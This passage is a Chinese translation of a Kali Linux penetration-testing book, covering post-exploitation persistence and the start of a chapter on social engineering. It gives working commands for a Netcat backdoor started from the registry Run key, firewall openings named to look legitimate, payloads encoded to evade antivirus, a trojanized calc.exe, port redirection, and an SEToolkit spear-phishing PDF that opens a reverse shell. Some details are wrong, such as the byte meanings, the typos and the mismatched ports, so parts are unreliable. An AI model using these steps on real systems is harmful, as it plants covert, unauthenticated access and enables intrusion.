  \ 框架使用 `GETGUI` 脚本自动启用 RDP 服务。\n\n从 meterpreter 提示符运行时，下图中所示的命令行会创建账户的用户名和密码，从登录界面中隐藏该账户，并对注册表进行必要的更改以保持持久化。下一幅截图显示了用于创建一个看似合法账户（`Service\
  \ Account`）且带有简单密码的命令。\n\n![](img/index-170_1.png)\n\n使用 Kali 的 `rdesktop` 程序连接到被控的远程桌面。\n\
  \n[153]\n\n### 漏洞利用 – 持久化（Post Exploit – Persistence）\n\n#### 远程启用虚拟网络计算（Virtual\
  \ Network Computing）\n如果系统包含已知被攻破的应用程序（特别是远程访问程序），则可能利用现有漏洞来利用系统。例如：\n\n- 可能从注册表中提取某些程序的远程访问密码。VNC\
  \ 将密码存储在注册表中，可以通过手动提取注册表或上传并运行如 NirSoft 的 `VNCPassView` 等应用程序来获取。\n- 不同版本的 VNC 包含可以利用的漏洞。如果用户安装了当前版本，可以卸载该版本并替换为旧版本。由于版本之间的功能相似，用户可能察觉不到替换，但攻击者可以使用旧版\
  \ VNC 中的身份验证绕过漏洞在后渗透阶段维持访问。\n\nMetasploit 能够使用 `VNCINJECT` 模块直接向受利用的系统引入 VNC。\n\n\
  在下图中，选择了 VNC 作为负载，而不是常规的 `reverse_TCP` shell：\n\n![](img/index-171_1.jpg)\n\n[154]\n\
  \n## 第 6 章\n\n这种攻击不需要任何身份验证。如果你正在测试客户端站点，请确保在证明漏洞后从被控系统中移除所有漏洞程序——否则，你创建了一个任何攻击者都能发现的访问点！\n\
  \n## 使用持久化代理\n传统上，攻击者会在被控系统中放置后门——如果正门为合法用户提供授权访问，后门应用程序则允许攻击者返回到受利用的系统并访问服务和数据。\n\
  \n\n\n\n\n遗憾的是，传统的后门提供的交互性有限，且设计初衷并非为了在受害系统内长时间持久化运行。这被攻击者社区认为是一个巨大的缺陷，因为一旦后门被发现并移除，就需要额外的工作来重复渗透步骤并利用系统，而防守网络及其资源的、有预备的系统管理员会使这些操作变得更加困难。\n\
  \nKali 现在专注于持久化代理，如果使用得当，这些代理更难被检测到。我们将回顾的第一个工具是久名大鼎的 `Netcat`。\n\n### 使用 Netcat\
  \ 作为持久化代理\n`Netcat` 是一个应用程序，支持使用“原始” `TCP` 和 `UDP` 数据包对网络连接进行读取和写入。与 `Telnet` 或\
  \ `FTP` 等服务组织的数据包不同，`Netcat` 的数据包不带有特定于服务的报头或其他通道信息。这简化了通信，并提供了一个近乎通用的通信通道。\n\n\
  `Netcat` 的最后一个稳定版本由 Hobbit 于 1996 年发布，并且它一直如往常地好用；事实上，它经常被称为 `TCP/IP 瑞士军刀`。`Netcat`\
  \ 可以执行许多功能，包括以下功能：\n\n• 端口扫描\n• 通过获取标志页（Banner grabbing）识别服务\n• 端口重定向和代理\n• 文件传输和聊天，包括对数据取证和远程备份的支持\n\
  • 在受害系统中作为后门或交互式持久化代理使用\n\n[155]\n\n渗透后 – 持久化\n\n此时，我们将重点关注使用 `Netcat` 在受害系统上创建一个持久化的\
  \ shell（壳）。尽管接下来的示例使用 `Windows` 作为目标平台，但在基于 Unix 的平台上使用时功能是相同的。\n\n在后续截图所示的示例中，我们将保留执行文件的名称——`nc.exe`；然而，为了最小化检测，在使用之前对其重命名是常见操作。即使经过重命名，它通常也会被杀毒软件识别；许多攻击者会修改或移除\
  \ `Netcat` 源代码中不需要的元素并在使用前重新编译；此类更改可以改变杀毒程序用于识别该程序为 `Netcat` 的特定特征码，使其对杀毒软件变得不可见。\n\
  \n`Netcat` 存储在 Kali 的 `/usr/share/windows-binaries` 仓库中。要将其上传到受害系统，在 `meterpreter`\
  \ 内部输入以下命令：\n\n```\nmeterpreter> upload/usr/share/windows-binaries/nc.exe C:\\WINDOWS\\\
  system32\n```\n\n上述命令的执行结果如下图所示：\n\n![](img/index-173_1.png)\n\n你不一定非将其放在 `system32`\
  \ 文件夹中；但是，由于该文件夹中文件类型数量且种类杂，这是在受害系统中隐藏文件的最佳位置。\n\n在对一个客户端进行渗透测试时，我们在一个服务器上发现了六个独立的\
  \ `Netcat` 实例。`Netcat` 曾被两个不同的系统管理员安装过两次以支持网络管理；另外四个实例是由外部攻击者安装的，直到渗透测试时才被发现。因此，务必检查目标机器是否已经安装了\
  \ `Netcat`！\n\n如果你没有 `meterpreter` 连接，可以使用`简单文件传输协议`（`TFTP`）来传输文件。\n\n接下来，配置注册表在系统启动时启动\
  \ `Netcat`，并使用以下命令确保它监听 `444` 端口（或你选择的任何其他端口，只要未被占用即可）：\n\n[156]\n\n## 第 6 章\n\n\
  ```\nmeterpreter>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\\
  run -vv nc -d 'C:\\windows\\system32\\nc.exe -Ldp 444 -e cmd.exe'\n```\n\n使用以下 `queryval`\
  \ 命令确认注册表更改已成功实施：\n\n```\nmeterpreter>reg queryval -k HKLM\\software\\microsoft\\\
  windows\\currentverion\\run -vv nc\n```\n\n使用 `netsh` 命令在本地防火墙上打开一个端口，以确保受害系统接受到\
  \ `Netcat` 的远程连接。了解目标操作系统非常重要。`netsh advfirewall firewall` 命令行上下文用于 `Windows Vista`、`Windows\
  \ Server 2008` 及更高版本；`netsh firewall` 命令用于更早的操作系统。\n\n要在本地 `Windows` 防火墙上添加端口，在\
  \ `meterpreter` 提示符处输入 shell 命令，然后使用相应的命令输入规则。在命名规则时，使用诸如 `svchostpassthrough` 的名称，暗示该规则对于系统的正常运行至关重要。示例命令所示：\n\
  \n```\nC:\\Windows\\system32>netsh firewall add portopening TCP 444 \"service passthrough\"\
  \n```\n\n使用以下命令确认更改已成功实施：`C:\\windows\\system32>netsh firewall show portopening`\n\
  \n上述命令的执行结果如下图所示：\n\n![](img/index-174_1.png)\n\n[157]\n\n渗透后 – 持久化\n\n当端口规则确认后，确保\
  \ `reboot` 选项有效。\n\n• 在 `meterpreter` 提示符处输入以下命令：\n```\nmeterpreter> reboot\n```\n\
  • 在交互式 `Windows` shell 中输入以下命令：\n```\nC:\\windows\\system32>shutdown –r –t 00\n\
  ```\n\n要远程访问受害系统，在提示符输入 `nc`，指定连接的详细程度（`-v` 报告基本信息，`-vv` 报告更多信息），然后输入 IP 地址，如下所示：\n\
  \n![](img/index-175_1.png)\n\n遗憾的是，使用 `Netcat` 有一些局限性——传输没有身份验证或加密，并且会被杀毒软件检测。\n\
  \n缺乏加密的问题可以通过 `cryptcat` 解决，它是使用 Twofish 加密来保护数据的 Netcat 变体。Twofish 加密由 Bruce Schneier\
  \ 开发，是一种高级对称块算法，能为加密数据提供相当保护。\n\n要使用 `cryptcat`，确保有一个配置了强密码的监听器：\n\n```\nroot@kali:~#\
  \ cryptcat –k password –l –p 444\n```\n\n接下来，将 `cryptcat` 上传到受害系统，并使用以下命令配置连接到监听器的\
  \ IP 地址：\n\n```\nC:\\cryptcat –k password <listener IP address> 444\n```\n\n[158]\n\
  \n第 6 章\n\n遗憾的是，`Netcat` 及其变体仍然能被大多数杀毒程序检测。可以使用十六进制编辑器修改 `Netcat` 的源代码来使其变得不可检测；这有助于规避杀毒软件的特征匹配操作，但这可能是一个漫长的尝试过程。更有效的方法是利用\
  \ Metasploit Framework 的持久化机制。\n\n### 使用 Metasploit Framework 持久化\nMetasploit 的\
  \ `meterpreter` 包含多个支持在受害系统上实现持久化的脚本。我们将检查用于在受害系统中放置后门的脚本选项：`metsvc` 和 `persistence`。\n\
  \n#### 使用 metsvc 脚本\n`metsvc` 脚本是 `meterpreter` 的网络服务封装，允许其作为 Windows 服务运行或作为命令行应用程序运行。它通常用作后门以维持与受害系统的通信。要使用\
  \ `metsvc`，首先渗透系统，然后将 `meterpreter` 迁移到 `explorer.exe` 进程以获得更稳定的 shell。\n\n\n\n\n\
  \n通过调用 `run` 命令执行 `metsvc` 代理，如下截图所示。如你所，它创建一个临时安装目录，上传三个文件（`metsrv.dll`、`metsvc-server.exe`\
  \ 和 `metsvc.exe`），然后启动 `metsvc`。\n\n![](img/index-176_1.png)\n\n[159]\n\n### 漏洞利用后\
  \ – 持久化\n\n为了与持久化的 `metsvc` 代理交互，攻击者打开 Metasploit Framework 并选择 `use exploit/multi/handler`，负载选择为\
  \ `windows/metsvc_bind_tcp`，如下截图所示。其他参数（IP 地址和端口）也已设置。\n\n![](img/index-177_1.png)\n\
  \n当执行漏洞命令时，两个系统之间将直接打开会话，允许从 meterpreter 命令行进行权限提升和其他操作。漏洞命令的执行情况如下截图所示：\n\n![](img/index-177_2.png)\n\
  \n[160]\n\n## 第 6 章\n\n`metsvc` 脚本不需要身份验证；一旦代理到位，任何人都可以使用它来访问受攻击的系统。大多数攻击者不会在使用此方法，除非修改源代码使其需要身份验证，或者确保有某种方法可以过滤掉远程连接。\n\
  \n更重要的是，这不是一种隐蔽攻击。任何列出运行进程的尝试（例如在 meterpreter 提示符中输入 `ps` 命令）都会识别出 `metsvc` 服务以及可执行文件正在\
  \ `Temp` 目录运行的事实——这非常可疑！在下面的截图中，位于 `Temp` 文件夹中具有随机名称（`CvjrsZWOMK`）的目录是系统被入侵的明显标志：\n\
  \n![](img/index-178_1.png)\n\n对 `Temp` 文件夹进行简单检查即可识别出三个恶意文件，如下截图所示；然而，这些文件在被手动检查之前，通常会被杀毒软件标记。\n\
  \n![](img/index-178_2.png)\n\n#### 使用持久化脚本\n\n获取持久化的更有效方法是使用 meterpreter 提示符的持久化脚本。\n\
  \n系统被利用且 `migrate` 命令将初始 shell 移动到更安全的服务后，攻击者可以 meterpreter 提示符调用持久化脚本。\n\n[161]\n\
  \n### 漏洞利用后 – 持久化\n\n在命令中使用 `-h` 可以识别创建持久化后门的可用选项，如下截图所示：\n\n![](img/index-179_1.png)\n\
  \n在如下所示的示例中，我们配置了持久化在系统启动时自动运行，并尝试每 10 秒连接一次我们的监听器。监听器被识别为远程系统（`-r`），带有特定的 IP 地址和端口。此外，我们可以选择使用\
  \ `-U` 选项，它将在用户登录系统时启动持久化。\n\n![](img/index-179_2.png)\n\n注意，我们任意选择了端口 `444` 供持久化使用；攻击者必须验证本地防火墙设置以确保该端口已开启，或者使用\
  \ `reg` 命令打开端口。像大多数 Metasploit 模块一样，只要端口未被占用，可以选择任何端口。\n\n[162]\n\n## 第 6 章\n\n\
  持久化脚本会将 VBS 文件放置在临时目录中；然而，你可以使用 `-L` 选项指定不同的位置。脚本还会将该文件添加到注册表的本地自启动运行部分。\n\n由于持久化脚本不需要身份验证，任何人都可以使用它来访问受攻击的系统，因此在发现或完成渗透测试后，应尽快从系统中移除。要删除脚本，请确认清理所需的资源文件位置，然后执行以下资源命令：\n\
  \n```\nmeterpreter> run multi_console_command -rc\n```\n\n```\n/root/.msf4/logs/persistence/RWBEGGS-1E69067_20130920.0024/RWBEGGS-1E69067_20130920.0024.rc\n\
  ```\n\n### 使用 Metasploit 创建独立的持久化代理 \n\n可以使用 Metasploit Framework 创建一个独立的可执行文件，该文件可以在受攻击的系统上保持持久化，并允许交互式通信。独立包的优势是它可以预先准备和测试，以确保连通性，并进行编码以绕过本地杀毒软件。\n\
  \n要制作简单的独立代理，在 Kali 的命令行提示符上启动 `msfconsole`。\n\n使用 `msfpayload` 构建持久化代理。在如下所示的示例中，代理被配置为使用\
  \ `reverse_tcp` shell，该 shell 将连接到本地主机 `192.168.43.130` 的端口 `4444`。代理名为 `attack1.exe`，将使用\
  \ `win32` 可执行文件模板。\n\n![](img/index-180_1.png)\n\n独立代理只会在未安装杀毒软件的受攻击系统上运行，或者在先使用相应的\
  \ meterpreter 命令禁用杀毒软件的情况下。为了绕过杀毒软件，后门必须经过编码。\n\n[163]\n\n### 漏洞利用后 – 持久化\n\n编码负载有几种不同的选项，如下截图所示：\n\
  \n![](img/index-181_1.png)\n\n要查看可用选项，使用 `show encoders` 命令。\n\nMetasploit 使用约 30\
  \ 种不同的编码器；默认情况下，如果没有指定编码器，它将选择最好的编码。\n\n一个很好的编码器是 `shikata_ga`。该编码器针对 4 字节密钥实现多态\
  \ XOR 编码，被 Metasploit 评为“优秀”。\n\n为了编码准备好的 `attack.exe`，我们使用以下命令：\n\n```\nmeterpreter>\
  \ msfencode -i attack.exe -o encoded_attack.exe -e x86/shikata_ga -c 5\n```\n\n\
  每次重新编码，它都会更难以检测。然而，可执行文件的大小也会增加。\n\n[164]\n\n## 第 6 章\n\n可以直接从 Kali 创建完整负载。不仅可以对其编码，我们还可以配置编码模式以避免某些字符。例如，在编码代理时应避免以下字符，因为它们会导致发现和失败：\n\
  \n- `\\x00` 代表零字节\n- `\\xa0` 代表换行\n- `\\xad` 代表回车\n\n要创建多编码负载，使用以下命令：\n\n```\nmsfpayload\
  \ windows/meterpreter/bind_tcp LPORT=444 R | msfencode -e x86/shikata_ga -c 5 -t\
  \ raw -a x86 -b '\\x00\\xa0\\xad' -c 5 -x /root/Desktop/attack.exe -o /root/Desktop/encoded_attack.exe\n\
  ```\n\n你还可以将 `msfpayload` 绑定到现有的可执行文件，修改后的可执行文件和持久化代理都将工作。为了将持久化代理绑定到类似计算器（`calc.exe`），首先将相应的\
  \ `calc.exe` 文件复制到 Metasploit 的模板文件夹，位于 `/usr/share/metasploit-framework/data/templates/`。模板到位后，使用以下命令：\n\
  \n```\nmsfpayload windows/meterpreter/bind_tcp LPORT=444 R | msfencode -t exe -x\
  \ calc.exe -k -o encoded_calc_attack.exe -e x86/shikata_ga -c 5\n```\n\n可以将代理放置在目标系统上，重命名为\
  \ `calc.exe` 以替换原始计算器，然后执行。\n\n遗憾的是，几乎所有 Metasploit 编码的可执行文件都能被客户端杀毒软件检测到。这归于渗透测试人员将加密负载提交给\
  \ VirusTotal 等网站。\n\n## 重定向端口以绕过网络控制\n\n到为止，我们检查了对受攻击系统的远程控制访问，假设受害者和攻击者机器之间有直接连接；然而，这种连通性经常被防火墙等网络设备控制或阻止。\n\
  \n\n\n\n\n# [165]\n\n## 漏洞利用 – 持久化\n\n攻击者可以使用端口重定向来绕过这些控制，端口重定向是一种在定义端口上监听并将原始数据包转发到特定辅助位置的指定系统。\n\
  \nKali 提供了多种支持端口重定向的工具，包括 `nc`、`cryptcat`、`socat`、`ssh`、`fpipe` 以及 Metasploit 的\
  \ `meterpreter`；我们将在后续章节介绍一些示例。\n\n### 示例 1 – 简单的端口重定向\n可以使用简单的端口重定向，例如渗透了位于`非军事化区`（`DMZ`）外部的系统，并且需要从远程位置与内部系统通信。\n\
  \n在 DMZ 的受攻的系统上，使用以下命令配置 `Netcat` 实例来监听传入的命令并将其转发到目标：\n\n```\nroot@kali:~# nc -l\
  \ -p 44444 -e <TAGET IP> 444\n```\n\n此命令将调用 `Netcat` (`nc`) 监听（`-l`）传入的流量，并执行（`-e`）将这些传入的流量传输到目标端口\
  \ `444` 上。端口不是固定的，且在监听/转发主机和最终目标上的端口不需要相同。\n\n如果你缺乏关于目标内部网络的完整信息，可以尝试以下命令：\n\n```\n\
  root@kali:~# nc -l -p <local listening port> -c \"nc <TARGET IP> <TARGET port>\"\
  \n```\n\n此命令将本地（攻击者）`Netcat` 实例设置为在指定端口上监听（`-l`），然后指示 `Netcat` 在每次建立新连接时为创建一个新进程（`-c`）。\n\
  \n这个简单的示例允许外部人员连接到直连网络；然而，它不允许双向数据连接，而某些工具是需要这种连接。\n\n# [166]\n\n## 第 6 章\n\n###\
  \ 示例 2 – 双向端口重定向\n考虑三个独立的 Windows 数据系统：\n\n[攻击者] | [转发者 ] | [目标]\n\n为了使用 `Netcat`\
  \ 启用双向通信通道，我们必须使用命名管道。命名管道（也称为 `FIFO`）是创建定义的进程间通信的手段；这允许我们将其作为一个对象处理，从而在发布命令时更容易管理。在接下来的攻击示例中，我们创建了一个名为\
  \ `reverse` 的命名管道来处理双向通信。\n\n攻击者在其本地系统上有一个 `Netcat` 实例，使用以下命令设置为监听 `6661` 端口：\n\n\
  ```\nnc -l 6661\n```\n\n转发者是一个安装了 `Netcat` 实例的受控机器，它将监听传入的数据包并将其转发到目标；它使用以下命令配置为监听\
  \ `6666` 端口：\n\n```\nnc -l 6666\n```\n\n在目标系统上，输入以下命令创建命名管道：\n\n```\nmkfifo reverse\n\
  ```\n\n然后，使用以下命令配置本地 `Netcat` 实例，使用该命名管道跨越转发系统与攻击者建立双向通信：\n\n```\nnc localhost 6661\
  \ 0<reverse | nc localhost 6666 1>reverse\n```\n\n使用 `socat` 也可以实现相同的双向数据流，它是为了实现此类类型的连接而设计的。此示例的命令将从目标系统执行并使用：\n\
  \n```\nsocat tcp:localhost:6661 tcp:localhost:6646\n```\n\n# [167]\n\n## 漏洞利用 –\
  \ 持久化\n\n## 总结\n在本章中，我们关注了攻击者杀伤链的最后阶段——命令、控制和通信阶段——在该阶段，攻击者使用持久代理与受控系统进行通信。\n\n\
  到本书第一部分的结束，在这一部分中我们详细检查了攻击者的杀伤链，看看它可以如何应用于渗透网络或孤立系统。\n\n在*第 2 部分*——*交付阶段*中，我们将利用各种漏洞利用路径检查杀伤链的具体应用。在*第\
  \ 7 章*——*物理攻击与社会工程学*中，我们将关注物理安全和社会工程学攻击。主题将包括攻击方法论的概述、制作敌对 USB 设备和恶意微计算机、`社会工程工具包`（Social\
  \ Engineering Toolkit）以及测试系统对钓鱼攻击的韧性。\n\n# [168]\n\n# 第 2 部分\n\n## 交付阶段\n\n### 物理攻击与社会工程学\n\
  ### 无线通信的利用\n### Web 应用程序侦察与利用\n### 远程访问通信的利用\n### 客户端利用\n### 安装 Kali Linux\n\n\
  ## 物理攻击与社会工程学\n\n社会工程学，特别是当与目标系统的物理访问相结合时，是渗透测试或实际攻击中最单一成功的攻击向量。\n\n作为支持杀伤链的攻击路径，社会工程学侧重于攻击的非技术方面，利用人的信任和天生的乐助人本性来欺骗并操纵他们，使其渗透网络及其资源。\n\
  \n社会工程学攻击的成功取决于两个关键因素：\n\n- 在侦察阶段获得的知识。攻击者必须知道与目标相关的名称和用户名；更重要的是，攻击者必须理解网络上用户的关注点。\n\
  - 了解如何应用这些知识来说服潜在目标通过点击链接或执行程序来激活攻击。例如，如果目标公司刚刚与以前的竞争对手合并，员工的职业安全可能会可能是他们最首要考虑的问题。因此，与该主题相关的电子邮件或文档可能会被目标人员打开。\n\
  \nKali Linux 提供了多种工具和框架，如果使用社会工程学作为打开文件或执行某些操作的理由，它们的成功率会更高。示例包括脚本攻击（包含 Base、WMI\
  \ 和 PowerShell 脚本）、由 Metasploit Framework 创建的可执行文件，以及 `BeEF`（浏览器利用框架）。\n\n### 物理攻击与社会工程学\n\
  \n在本章中，我们将关注`社会工程工具包`（Social Engineering Toolkit）。使用这些工具的技巧将作为使用社会工程从其他工具部署攻击的模型。\n\
  \n在本章结束时，你将学习如何使用 SEToolkit 完成以下操作：\n\n- 使用鱼叉式钓鱼和 Java App 攻击获取远程 shell\n- 使用凭据收集攻击收获或收集用户名和密码\n\
  - 启动标签劫持和网页注入\n- 采用多攻击 Web 方法\n- 使用 PowerShell 字母数字注入\n\n为了支持 SET 的社会工程攻击，将描述以下通用实现实践：\n\
  \n- 隐藏恶意可执行文件并混淆攻击者的 URL\n- 使用 DNS 重定向升级攻击\n\n你还将学习如何基于树莓派微计算机创建并实现物理物理设备。\n\n####\
  \ 社会工程工具包\n社会工程工具包 (`SEToolkit`) 由 David Kennedy (`ReL1K`) 创建编写，并由一个活跃的合作小组维护（www.social-engineer.org）。它是一个开源\
  \ Python 驱动框架，专门为促进社会工程攻击而设计。\n\nSEToolkit 的巨大优势是它与 Metasploit Framework 的互连性，后者提供了利用所需的有效负载、绕过杀毒软件的加密，以及当受控系统向攻击者发送\
  \ shell 时连接的监听模块。\n\n在启动 SEToolkit 之前，你可能希望对配置文件进行一些修改。\n\n# [172]\n\n## 第 7 章\n\
  \n\n\n\n社会工程工具包（Social Engineering Toolkit）预配置了常见的默认设置；然而，这些设置可以被修改，以适应特定的攻击场景。在\
  \ Kali 中，配置文件文件为 `/usr/share/set/config/set_config`。修改此文件允许你控制以下内容：\n\n- Metasploit\
  \ 变量，包括位置、要使用的数据库、载荷（payload）的编码次数，以及在建立 meterpreter 会话后自动运行的命令。\n- `Ettercap` 和\
  \ `dsniff` 开关，用于辅助 DNS 重定向攻击和捕获身份凭据。通过控制 DNS，攻击者可以自动将一群人重定向到使用 `setoolkit` 创建的虚假网站。\n\
  - `sendmail` 或或其他邮件程序的配置，用于需要伪造电子邮件地址的攻击；这允许社会工程师通过使用看起来来自可信源（例如同一公司的高级经理）的电子邮件地址来增强攻击的信誉。\n\
  - 将要使用的电子邮件提供商，包括 Gmail、Hotmail 和 Yahoo。\n- 创建具有伪造发布者的自签名 Java Applet，激活 SSL 证书并窃取数字签名。\n\
  - 其他变量，如 IP 地址、端口分配和编码参数。\n\n要在 Kali 发行版中打开社会工程工具包（SET），进入 **Applications** | **Kali\
  \ Linux** | **Exploitation Tools** | **Social Engineering Toolkit** | `setoolkit`，或者在\
  \ shell 提示符输入 `setoolkit`。你将看到主菜单，如下截图所示：\n\n![](img/index-190_1.png)\n\n**[** **173**\
  \ **]**\n\n*物理攻击与社会工程*\n\n如果你选择 1) Social-Engineering Attacks，你将看到以下子菜单：\n\n![](img/index-191_1.png)\n\
  \n以下是社会工程攻击的简要说明：\n\n- 鱼叉式钓鱼攻击向量（Spear-Phishing Attack Vector）允许攻击者创建电子邮件并将其带有漏洞将其发送给目标受害者。\n\
  - 网站攻击向量（Website Attack Vectors）利用多种基于 Web 的攻击，包括：\n    - ° Java Applet 攻击方法伪造 Java\
  \ 证书并交付基于 Metasploit 的载荷。这是最成功的攻击之一，对 Windows、Linux 或 OSX 目标均有效。\n    - ° Metasploit\
  \ 浏览器漏洞方法使用 iFrame 攻击交付 Metasploit 载荷。\n    - ° 凭据收集攻击方法（Credential Harvester Attack\
  \ Method）克隆网站并自动重写 POST 参数，允许攻击者拦截并收集用户凭据；在收集完成后，它会将受害者重定向回原始网站。\n    - ° 标签劫持攻击方法（Tabnabbing\
  \ Attack Method）将非活动浏览器标签页上的信息替换为链接回攻击者的克隆页面。当受害者登录时，凭据将发送给攻击者。\n    - ° 劫持攻击方法（Web\
  \ Jacking Attack Method）利用 iFrame 替换使显示的 URL 链接看起来合法；然而，当点击它时会弹出一个窗口，然后被替换为恶意链接。\n\
  \n**[** **174** **]**\n\n## *第七章*\n\n° 多攻击 Web 方法（Multi-Attack Web Method）允许攻击者选择同时启动的几种攻击中的部分或全部，包括\
  \ Java Applet 攻击方法、Metasploit 浏览器漏洞方法、凭据收集攻击方法、标签劫持攻击方法和中间人攻击方法（Man Left in the\
  \ Middle Attack Method）。\n- 感染性介质生成器（Infectious Media Generator）创建一个 `autorun.inf`\
  \ 文件和 Metasploit 载荷。一旦刻录或复制到 USB 设备或物理介质（CD 或 DVD）并插入目标系统，它将触发 `autorun`（如果启用了 autorun）并破坏系统。\n\
  - 创建载荷和监听器模块（Create a Payload and Listener）是一种快速的菜单驱动型创建 Metasploit 载荷的方法。攻击者必须使用单独的社会工程攻击来说服目标运行它。\n\
  - 批量邮件发送攻击（MassMailer Attack）允许攻击者向单个电子邮件地址或收件人列表发送多个自定义电子邮件。\n- 基于 Arduino 的攻击向量（Arduino-Based\
  \ Attack Vector）对基于 Arduino 的设备（如 Teensy）。由于这些设备连接到物理 Windows 系统时会识别为 USB 键盘，因此它们可以绕过禁用\
  \ autorun 或其他终端保护的安全措施。\n- 短信伪造攻击向量（SMS Spoofing Attack Vector）允许攻击者向人的移动设备发送特制的短信息服务，并伪造信息的来源。\n\
  - 无线访问点攻击向量（Wireless Access Point Attack Vector）将在攻击者系统上创建一个伪造的无线访问点和 DHCP 服务器，并将所有\
  \ DNS 查询重定向到攻击者。攻击者随后可以启动各种攻击，例如 Java Applet 攻击或凭据收集攻击。\n- 二维码生成攻击向量（QRcode Generator\
  \ Attack Vector）创建一个与攻击相关的定义 URL 二维。\n- PowerShell 攻击向量（Powershell Attack Vectors）允许攻击者创建依赖\
  \ PowerShell 的攻击，PowerShell 是所有 Windows Vista 及更高版本中可用的命令行 shell 和脚本语言。\n- 第三方模块（Third\
  \ Party Modules）允许攻击者使用 `Remote Administration Tool Tommy Edition` (`RATTE`）作为 Java\
  \ Applet 攻击的一部分或作为独立载荷。RATTE 是一个文本菜单驱动的远程访问工具。\n\nSESEToolkit 还提供了一个“快速渗透测试”（Fast-Track\
  \ Penetration Testing）菜单项，它提供了快速访问某些特殊工具，这些工具支持 SQL 数据库的暴力破解识别和密码破解，以及基于 Python、SCCM\
  \ 攻击向量、Dell 计算机 DRAC/机箱利用、用户枚举和 `PSEXEC` PowerShell 注入的自定义漏洞。\n\n**[** **175** **]**\n\
  \n*物理攻击与社会工程*\n\n菜单还提供了更新 Metasploit Framework、SEToolkit 和 SEToolkit 配置的选项。然而，应避免这些额外选项，因为\
  \ Kali 并不完全支持它们，并且可能会导致冲突。\n\n作为 SEToolkit 优势的初步示例，我们将看到如何利用它获取远程 shell——即从受损系统到攻击者系统的连接。\n\
  \n### 鱼叉式钓鱼\n\n钓鱼（Phishing）是一种针对大量受害者（如已知的 Internet 用户列表）的电子邮件欺诈攻击。目标通常没有关联，电子邮件并未尝试诉诸任何特定个人。相反，它包含大众感兴趣的内容（例如，“点击获取廉价药物”）以及恶意链接或附件。攻击者利用概率认为至少有人会点击链接。\n\
  \n另一方面，鱼叉式钓鱼是一种高度特定的钓鱼攻击形式——通过特定方式编写电子邮件，攻击者希望吸引特定受众的注意。例如，如果攻击者知道销售部门使用特定的应用程序来管理客户关系，他可能会伪造一个来自该应用程序供应商的电子邮件，主题为“紧急修复\
  \ - 点击链接下载”。\n\n钓鱼攻击的成功率通常低于百分之五；然而，鱼叉式钓鱼攻击的成功率在百分之四十到八十之间。这就是为什么侦察阶段的信息对于这种攻击的成功至关重要。\n\
  \n平均而言，向目标发送十到十五封电子邮件就会有一个被点击。\n\n在启动攻击之前，确保 Kali 上安装了 `sendmail`（`apt-get install\
  \ sendmail`）并将 `set_config` 文件中的 `SENDMAIL=OFF` 更改为 `SENDMAIL=ON`。\n\n\n\n选择 1 以执行群发攻击；随后你将看到一个攻击载荷列表，如下截图所示：\n\
  \n![](img/index-194_2.png)\n\n最有效的攻击之一是 15) `Adobe PDF Embedded EXE Social Engineering`；然而，所选择的攻击方式将取决于攻击者在侦察阶段获得的对可用目标的了解程度。\n\
  \n[ 177 ]\n\n### 物理攻击与社会工程学\n\n当被提示使用你自己的 PDF 或内置的空白 PDF 进行攻击时（如图所示），请选择 2 使用内置空白载荷。随后你将会被提示选择载荷。\n\
  \n![](img/index-195_1.png)\n\n通过对多个网络进行测试，我们发现选项 1 和 2（`Windows Reverse TCP shell`\
  \ 和 `Windows Meterpreter Reverse TCP`）是最可靠的载荷。在本例中，我们将选择 `Windows Meterpreter Reverse\
  \ TCP`——当 PDF 被打开时，它将执行一个回传到攻击系统的反向 shell。\n\n在隐蔽性比可靠性更重要的情况下，`Windows Meterpreter\
  \ Reverse HTTPS` 是最佳选择。\n\n`SEToolkit` 将提示输入载荷监听器（攻击者的 IP 地址）和监听端口，默认端口为 `443`。\n\
  \n下一个菜单提示更改 PDF 文件的文件名；默认名称为 `moo.pdf`，如下所示：\n\n![](img/index-195_2.png)\n\n[ 178\
  \ ]\n\n## 第 7 章\n\n默认名称可能无法吸引潜在受害者打开文件；此外，它可能会被客户端安全软件识别。出于这些原因，应该更改文件名。名称应反映受攻击的目标受众。例如，如果你的目标是财务部门，请给\
  \ PDF 文件命名为《税法修正案》（Tax Law Amendments）。\n\n现在你将获得攻击单个电子邮件地址或进行群发邮件（例如，目标公司的员工列表，或公司内的某个特定小组）。本例选择了选项\
  \ 1。\n\n`SEToolkit` 随后将提示使用预定义模板或制作一次性电子邮件模板。如果你选择了预定义模板，将可以使用可用选项：\n\n![](img/index-196_1.png)\n\
